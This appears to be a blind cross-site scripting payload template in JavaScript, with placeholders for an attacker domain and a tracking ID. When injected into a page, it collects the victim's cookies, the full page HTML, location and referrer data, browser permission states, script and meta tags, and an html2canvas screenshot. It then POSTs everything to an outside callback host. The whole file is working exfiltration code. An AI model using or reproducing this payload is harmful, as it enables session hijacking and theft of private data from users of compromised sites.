const config = {
    domain: '{{DOMAIN}}',
    screenshot_enabled: true
}
function collectBrowserAndWebsiteInfo() {
    const info = {
      // Browser core information
      userAgent: navigator.userAgent,
      cookies: document.cookie ?? null,

      // Document Source
      documentSource: document.documentElement.outerHTML,

      // Document information
      document: {
        title: document.title,
        URL: document.URL,
        domain: document.domain,
        referrer: document.referrer,
        lastModified: document.lastModified,
        readyState: document.readyState,
        characterSet: document.characterSet,
        contentType: document.contentType,
        designMode: document.designMode,
        children: document.children.length,
      },
      
      // Location information
      location: {
        href: window.location.href,
        protocol: window.location.protocol,
        host: window.location.host,
        hostname: window.location.hostname,
        port: window.location.port,
        pathname: window.location.pathname,
        search: window.location.search,
        hash: window.location.hash,
        origin: window.location.origin
      },
      
      // Time information
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneName: new Date().toLocaleDateString(undefined, {timeZoneName: 'long'}).split(',')[1],
      currentTime: new Date().toString(),
    
    };
  
    // Get permissions status if available
    if (navigator.permissions) {
      info.permissions = {};
      const permissionsToCheck = ['geolocation', 'notifications', 'push', 'midi', 'camera', 'microphone', 'background-sync', 'ambient-light-sensor', 'accelerometer', 'gyroscope', 'magnetometer'];
      
      permissionsToCheck.forEach(permission => {
        navigator.permissions.query({name: permission}).then(result => {
          info.permissions[permission] = result.state;
          console.log(`Permission ${permission} status:`, result.state);
        }).catch(() => {
          info.permissions[permission] = 'not supported';
        });
      });
    }

    // Detect if running in iframe
    info.isInIframe = window.self !== window.top;
    
    // Get current scripts on the page
    info.scripts = Array.from(document.scripts).map(script => ({
      src: script.src,
      type: script.type,
      async: script.async,
      defer: script.defer
    }));
    
    // Get meta tags
    info.metaTags = Array.from(document.getElementsByTagName('meta')).map(meta => ({
      name: meta.name,
      content: meta.content,
      httpEquiv: meta.httpEquiv,
      property: meta.getAttribute('property')
    }));
  
    console.log('Browser and Website Information:', info);
    return info;
}

function sendInfoToServer(info){
    const uid = "{{UID}}";
    // Add unique identifier to the info object
    info['uniqueIdentifier'] = uid;

    // To get the information as a JSON string
    const jsonString = JSON.stringify(info);
    fetch(`//${config.domain}/cb`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: jsonString
    })
}

{HTML2CANVAS}
  
// Call the function to collect information
const browserInfo = collectBrowserAndWebsiteInfo();

// Screenshot
if (config.screenshot_enabled){
    html2canvas(document.body).then(function(canvas) {
        // convert canvas into image
        browserInfo['screenshot'] = canvas.toDataURL('image/png');
        sendInfoToServer(browserInfo);
    });
} else {
    sendInfoToServer(browserInfo);
}